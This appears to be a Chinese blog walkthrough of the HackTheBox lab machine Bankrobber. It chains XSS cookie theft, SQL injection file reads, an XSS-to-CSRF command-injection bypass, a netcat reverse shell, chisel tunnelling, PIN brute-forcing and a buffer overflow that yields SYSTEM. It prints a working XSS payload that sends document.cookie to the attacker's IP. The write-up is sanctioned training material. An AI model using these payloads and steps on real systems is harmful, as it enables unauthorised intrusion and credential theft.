> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/L6LWfUfRM9L3Ok1qpfJY5w)

靶机地址：https://www.hackthebox.eu/home/machines/profile/209

靶机难度：初级（3.2/10）

靶机发布日期：2020 年 2 月 19 日

靶机描述：

Bankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to

XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the

admin panel. The panel is found to contain additional functionality, which can be exploited to

read files as well as execute code and gain foothold. An unknown service running on the box is

found to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary

commands as SYSTEM.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/fVgib7X1icAQR9wBb9Lgpn878QJQBU7IiadjKDicaibvTU3mC3lgnvFfcL5icNF6931FDbsibuiagXN2qMROPM6HSGsg2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/D7MJlTPSSr6Oa72xMxnt7RPsQtO1D57IAib9HJAvDCTkxtAqwY6KZACpmdKNmDicNjb0hKiaicZIx1F1gnibbJ0Zmmw/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KukvSW8ErtSibZA4z4T2umT2AWdKY2EiaZZzDYUs8ic8rEegM5GP4XdCyQ/640?wx_fmt=png)  

可以看到靶机的 IP 是 10.10.10.154....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KiaHEYlfVos2kH7rfRYvZlprIgWZapxUKDQicjF1h9rSJibxI9I0Yauibqw/640?wx_fmt=png)

Nmap 可以发现运行着 SMB，HTTP 和 HTTPS，以及 mysql...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1K7I9l5Xgt9xrYxpducI8Qp4NvzIzFkwUnia0DlJ0FvmuNLrhQsZJYgnA/640?wx_fmt=png)

访问 http，这是一个货币加密的网页...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KI7hGhdkx4BUVganYDycKj1NvdY3NwDIjmBibpm6MWuNH6wYlhU0Jarw/640?wx_fmt=png)

注册表格用于创建新帐户，然后登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1K2PMjOMeRicDQa1oqZhBphdlmESibicPibwl34OVm0rga2hH5FblKvOibFQg/640?wx_fmt=png)

登录后定向到了这个页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KQTTay27vPPmDT8DFOAMGzwgAqsOiakHZ5GkXGVuSQy70Ho2hd3Ex8sA/640?wx_fmt=png)

随意输入会弹出提示框：说管理员可能会在批准交易之前对其进行审查...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KGHZTM0ADsEs1DdAfJNRHc8r5iazwicuWek6GhQT7Fl4HXicu0SeA80Bkw/640?wx_fmt=png)

利用 burp suite 分析后，看到用户名和密码的 cookie 是 base64 编码的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KNhS8XEYqUA2qMzdhR0bwI2fGcmvE3ibAtzR6NWkEopDzg2PibuibU9iaxg/640?wx_fmt=png)

对 comment 值进行注入测试，发现存在 **XSS 攻击 **...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KtibhoQl9lwM7KeTJw0bic8l5wYrP9Vn5Sw8bn3TqDM3NePqicibAQyZB0w/640?wx_fmt=png)

```
<img src=x onerror=this.src='http://10.10.14.51/?cookies='+btoa(document.cookie) />
```

注入后可发现 cookie 得哈希值...== 这是 base64，转码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1Ke0qvU9mFhicL5icOJgKVlfckOb9oovicLdMyaDQR2OGHKfOGb7j8LqkNw/640?wx_fmt=png)

```
echo -n ... | base64 -d
```

通过 XSS 获得了用户名和密码.. 登陆即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KxtRibict63ibuMufK9kyT3yCTOZA5w9SibQcVm5Os1UADGeDTAtu0cwdUg/640?wx_fmt=png)

登陆后，可以看到只可以使用 dir 命令，是防止黑客的攻击限制了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KDWwsZnhAzxac5nzt1jH8rV9SCEZRia6SoVYI6rOgsQ0cJzh5e9DDCwA/640?wx_fmt=png)

可以进行 sql 注入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1Ko0u5uuR2Zf2NvYCNrPCVErzlbfg7NCA1DWB7RiaO1Q8PzFRpF1uLbCQ/640?wx_fmt=png)

通过了 sqlmap 进行挖掘：

```
[参考mysql](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)
```

对 sql 注入的链接，利用 MySQL LOAD_FILE（）函数用于读取服务器上的文件...  

可以看到成功获得了 user 信息...

这里需要获得反弹 shell 外壳.. 否则无法继续下一步 root 信息获取...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1K9uYMEkErU4hZChHqnoG4riaCZnFsmibzxLrR3yibQzTWb80fbr5gKDJJw/640?wx_fmt=png)

在 admin 目录下发现了 backdoorchecker.php 文件，可以看到

```
$bad = array('$(','&');
```

 `$(` 并将 `&` 列入黑名单，并且

```
$_SERVER['REMOTE_ADDR'] == "::1"
```

仅允许来自其的请求... 所以可以利用 XSS 来创建一个 CSRF，开始测试下....  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1K8BrwUTJc6ndcljvFJZswFb6CsoIyjhHQcvTl8FzBjGXwocTxnzicQ2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KaNhnwkLcPrzlDrl7HPanicTtAMgE1sXAoeJEsNialS7icN6Yfg18xSagw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KvnBqwskyQRQRzwnWiaKKty29s9LSocjEsYG14DibtVjanb8ticwjyunlA/640?wx_fmt=png)

可以看到针对 backdoorchecker 文件的利用，测试了 ping 传输，可以返回数据...

这里就很多方法可以反弹 shell 了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KZiag2D9vaxnywwF2kPdSy4NmrCVsZyEAaRYFLe0kogNwsHLHriaexWlA/640?wx_fmt=png)

利用 powershell 上传 nc，然后 nc 执行获得了反弹 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KUVmkQ2SBdpKS6IJCSWq6xT8DPabW3HKjZr0fKkSbHiaGqXLNiaQyicvXg/640?wx_fmt=png)

```
netstat -ano | findstr LISTENING
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1Kic85RgSSmwhImYbrVgibKU7N5aVoatDicEoG43yTFq5FgWEvjUQ7ibDTGw/640?wx_fmt=png)

```
tasklist
```

当开始搜集信息时，在初目录就发现了 bankv2.exe 程序... 可以看到 TCP910 端口运行着 bankv2.exe 程序... 同 ID

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KyjqwGNZZ7ozXX2qy5qntvbCLAibibL6GShpyCL2x5libiahobwYTduOfsg/640?wx_fmt=png)

使用 nc 与该端口进行通讯时，进行链接了，但是当我按下 Enter 键随意输入四个字符后... 被拒绝了...

而且该文件无法 copy... 本来想 smbserver 到本地进行分析..

这里将使用隧道技术进行渗透... 利用

```
[chisel](https://github.com/jpillora/chisel)
```

工具搭建隧道！！参考这篇：

```
[文章](https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html)
```

介绍了 chisel 技术的使用！！  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1Kd0HExWLg4LkwKEf0JQByDiafnkQWVNBwfy7sNmoKvW5dfoODCbGKEMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KHRqHPZ4M43cxYskqIMbuic4FZeFLbwmG4XuU6KFuxaiaDJTUNx8f7RLQ/640?wx_fmt=png)

```
./chisel_linux_amd64 server --port 6000 --reverse
```

下载好后解压，然后开启本地的隧道...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KQs3d4NXzSMuibibaZmXwbnJTD9iaZhiaiaVplem3vrFtxxuupU44Yet2aDw/640?wx_fmt=png)

```
chisel.exe client 10.10.14.51:6000 R:910:127.0.0.1:910
```

隧道成功建立...

通过本地创建的隧道，链接了靶机 910 端口... 这里需要进行暴力破解四位数 PIN 码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KpJ1UYsP2dsicGsM9Z6CR4XGQDoeCJEqiaibg5JodZkibY6B2CClc6iaSjGA/640?wx_fmt=png)

可以看到... 通过简单的 python 编写 0~9999 进行爆破，0021 是 PIN 码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KicialpCh1G4dRcjgIAjgbDN3dDz7JMJobCHs6U7pYEXT7Bd1AgfSmevw/640?wx_fmt=png)

0021 是正确的... 但是继续输入任何字符，返回结果都是一样...

这里应该存在缓冲区溢出... 测试看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KWkIIwmiaibR16yxSDByFw4w0OYtOOP96v36Ry2XamwDRiabeibnT7YUUZQ/640?wx_fmt=png)

通过 AAAA 测试...42A 和 32A 之间，42A 输入后，存在缓冲区溢出值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KRVjhtMwvaW1XTLmLe3nRiaOCaictqdnUOjiaFOWWLUqjbwwwVktTASAzg/640?wx_fmt=png)

```
/usr/bin/msf-pattern_create -l 100
/usr/bin/msf-pattern_offset -q 0Ab1
```

这里利用 kali 自带的 msf-pattern_create 来输出随机生成的 100 值... 然后利用 msf-pattern_offset 将程序输出的值进行解析...

获得偏移量 32... 只要利用 32 的偏移量进行注入 shell 即可获得外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOEPx72Rqtgj9Q9B4yN9Q1KgfNUByRwNzme3VaGNtZZ8Tb9hwJhcktjNX6TTFV8dMlHdnUY4JpLxA/640?wx_fmt=png)

通过前面提权上传的 nc64.exe，利用 python 简单把命令压缩到 32 偏量，然后输入...

成功获得了 system 权限的反向外壳...

成功获得了 root 信息...

这台靶机学习了 sql 注入，XXE 和 XSRF 外壳，python 爆破，隧道技术，缓冲区溢出等等...

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台简单的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/fVgib7X1icAQR9wBb9Lgpn878QJQBU7IiadjKDicaibvTU3mC3lgnvFfcL5icNF6931FDbsibuiagXN2qMROPM6HSGsg2A/640?wx_fmt=png)

**本文推荐实验：渗透 xss**

https://www.hetianlab.com/cour.do?w=1c=C9d6c0ca797abec2017041916134500001&pk_campaign=weixin-wemedia#stu

通过本课程的学习，你将学习到什么是 XSS，XSS 漏洞原理，以及如何利用 XSS 漏洞对目标系统进行渗透测试。  

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LfbzQb75ZqoK2T2YO9XTQYD0aDUibvcxdbLRqzCwlkYcn0HppvXpZuenRzjX8ibhzcibJJge9Bw9xc8A/640?wx_fmt=gif)

  

戳

  

“阅读原文”

  

  

体验免费靶场！